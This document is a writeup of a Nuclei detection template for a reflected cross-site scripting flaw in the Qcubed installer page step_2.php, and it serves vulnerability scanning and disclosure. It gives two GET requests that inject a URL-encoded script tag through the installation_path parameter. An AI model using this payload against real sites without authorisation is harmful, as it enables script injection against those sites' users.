# Nuclei Template: Qcubed - Cross-Site Scripting
**Template ID:** qcubed-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`qcubed-xss.yaml`)

## Vulnerability Information & PoC

## Description
Qcubed contains a cross-site scripting vulnerability which allows a remote attacker to inject arbitrary JavaScript via the /assets/php/_devtools/installer/step_2.php endpoint and the installation_path parameter.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
GET {{BaseURL}}/qcubed/assets/php/_devtools/installer/step_2.php?installation_path=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
```

## References
- https://github.com/qcubed/qcubed/issues/1230
